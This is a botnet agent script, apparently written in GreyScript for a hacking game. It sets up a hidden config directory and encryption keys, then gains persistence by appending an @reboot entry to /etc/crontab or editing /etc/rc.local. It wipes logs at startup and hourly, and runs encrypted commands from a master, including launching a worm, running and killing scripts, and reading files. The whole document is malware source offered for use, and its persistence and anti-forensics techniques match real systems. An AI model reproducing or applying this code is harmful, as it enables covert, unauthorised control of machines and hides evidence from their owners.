// slave.gs - Bot slave controller with cleanup and access detection
import_code("/lib/kyber_lib.gs")
import_code("/lib/lib_common.gs")
import_code("/scripts/utils/wipe_logs.gs")
import_code("/scripts/utils/sanitize_ip.gs")
import_code("/scripts/utils/accessLevel.gs")

CONFIG_DIR = "/root/.botnet"
PID_FILE = CONFIG_DIR + "/slave.pid"
VERSION = "1.0"
MASTER_PUBKEY_FILE = CONFIG_DIR + "/master.pub"
MY_PRIVKEY_FILE = CONFIG_DIR + "/slave.priv"
MY_PUBKEY_FILE = CONFIG_DIR + "/slave.pub"
COMMAND_DIR = CONFIG_DIR + "/commands"
RESPONSE_DIR = CONFIG_DIR + "/responses"

// Security: Validate paths stay within allowed directories
safe_path = function(path)
    allowed_prefixes = ["/root/.botnet/", "/scripts/utils/", "/bin/", "/tmp/"]
    for prefix in allowed_prefixes
        if path.indexOf(prefix) == 0 then return true
    end for
    return false
end function

init = function()
    comp = get_shell.host_computer
    comp.create_folder("/root", ".botnet")
    comp.create_folder(CONFIG_DIR, "commands")
    comp.create_folder(CONFIG_DIR, "responses")
    comp.create_folder("/scripts", "utils")
    priv = read_file(MY_PRIVKEY_FILE)
    if not priv then
        keys = Kyber.generate_keypair()
        write_file(MY_PRIVKEY_FILE, keys.private)
        set_permissions(MY_PRIVKEY_FILE, "600")
        write_file(MY_PUBKEY_FILE, keys.public)
        set_permissions(MY_PUBKEY_FILE, "644")
        // Set restrictive permissions on key files
        priv_file = comp.File(MY_PRIVKEY_FILE)
        pub_file = comp.File(MY_PUBKEY_FILE)
        if priv_file then priv_file.set_permission("600")
        if pub_file then pub_file.set_permission("644")
        master_pub = read_file(MASTER_PUBKEY_FILE)
        if master_pub then
            write_file(RESPONSE_DIR + "/register.enc", Kyber.encrypt_message(master_pub, keys.public))
            set_permissions(RESPONSE_DIR + "/register.enc", "600")
        end if
    end if
    setup_cron()
    // Clean up logs after startup
    wipe_logs()
end function

setup_cron = function()
    comp = get_shell.host_computer
    cron = comp.File("/etc/crontab")
    if cron == null then
        // Fallback: add to /etc/rc.local
        rc = comp.File("/etc/rc.local")
        if rc == null then return
        content = rc.get_content
        if content == null then return
        if content.indexOf("/bin/slave.gs") == null then
            rc.set_content(content.replace("exit 0", "/bin/slave.gs\nexit 0"))
            log_master("Added rc.local persistence", "INFO")
        end if
        return
    end if
    content = cron.get_content
    if content == null then return
    if content.indexOf("/bin/slave.gs") == null then
        cron.set_content(content + "@reboot root /bin/slave.gs\n")
        log_master("Added cron persistence", "INFO")
    end if
end function

process_commands = function()
    comp = get_shell.host_computer
    cmd_dir = comp.File(COMMAND_DIR)
    if cmd_dir == null then return
    for f in cmd_dir.get_files
        if f == null then continue
        if f.name[-4:] == ".enc" then
            cipher = f.get_content
            if cipher == null then continue
            priv = read_file(MY_PRIVKEY_FILE)
            if priv == null then continue
            cmd = Kyber.decrypt_message(priv, cipher)
            if cmd == null then continue
            result = execute_command(cmd)
            if result == null then continue
            pub = read_file(MASTER_PUBKEY_FILE)
            if pub == null then continue
            resp_enc = Kyber.encrypt_message(pub, result)
            if resp_enc == null then continue
            resp_dir = comp.File(RESPONSE_DIR)
            if resp_dir then
                write_file(RESPONSE_DIR + "/" + f.name, resp_enc)
                set_permissions(RESPONSE_DIR + "/" + f.name, "600")
            end if
            f.delete
        end if
    end for
end function

execute_command = function(cmd)
    parts = cmd.split(" ")
    if parts.len == 0 then return "ERROR|empty command"
    
    allowed = ["run", "kill", "update", "status", "clean", "worm", "read"]
    if allowed.indexOf(parts[0]) == null then return "ERROR|forbidden command"
    
    if parts[0] == "run" then
        if parts.len < 2 then return "ERROR|missing script"
        script = parts[1]
        // Validate script path to prevent directory traversal
        if not safe_path(script) then return "ERROR|access denied"
        args = parts[2:]
        pid = get_shell.launch(script, args)
        return "RUNNING|" + pid
    else if parts[0] == "kill" then
        if parts.len < 2 then return "ERROR|missing script"
        script = parts[1]
        if not safe_path(script) then return "ERROR|access denied"
        kill_all(script)
        return "KILLED|" + script
    else if parts[0] == "update" then
        return "UPDATE_READY"
    else if parts[0] == "status" then
        level = accessLevel(get_shell)   // FIXED: correct function name
        return "ALIVE|" + VERSION + "|" + level
    else if parts[0] == "clean" then
        wipe_logs()
        return "CLEANED"
    else if parts[0] == "worm" then
        if parts.len < 3 then return "ERROR|need master_pub_file and depth"
        // Validate master_pub_file path
        if not safe_path(parts[1]) then return "ERROR|access denied"
        // FIXED: pass 4th parameter "0" as current depth
        get_shell.launch("/bin/worm.gs", [parts[1], parts[2], get_shell.host_computer.public_ip, "0"])
        return "WORM_STARTED"
    else if parts[0] == "read" then      // ADDED: read command for logs
        if parts.len < 2 then return "ERROR|missing file"
        file_path = parts[1]
        // Validate file path to prevent directory traversal
        if not safe_path(file_path) then return "ERROR|access denied"
        f = get_shell.host_computer.File(file_path)
        if f then return "FILE|" + f.get_content
        else return "ERROR|file not found"
    else
        return "UNKNOWN_COMMAND"
    end if
end function

watchdog = function()
    if get_pids("slave.gs").len == 0 then
        get_shell.launch("/bin/slave.gs")
    end if
end function

main = function()
    init()
    write_file(PID_FILE, str(get_shell.pid))
    set_permissions(PID_FILE, "600")
    master_pub = read_file(MASTER_PUBKEY_FILE)
    my_ip = get_shell.host_computer.public_ip
    my_ip_safe = sanitize_ip(my_ip)
    if master_pub then
        write_file(RESPONSE_DIR + "/startup.enc", Kyber.encrypt_message(master_pub, "STARTUP|" + VERSION + "|" + my_ip_safe))
        set_permissions(RESPONSE_DIR + "/startup.enc", "600")
    end if
    // Periodic cleanup every hour
    last_clean = time
    while true
        process_commands()
        if time - last_clean > 3600 then
            wipe_logs()
            last_clean = time
        end if
        wait(5)
    end while
end function

if get_pids("slave.gs").len > 1 then
    print("Slave already running")
    exit()
else
    main()
end if
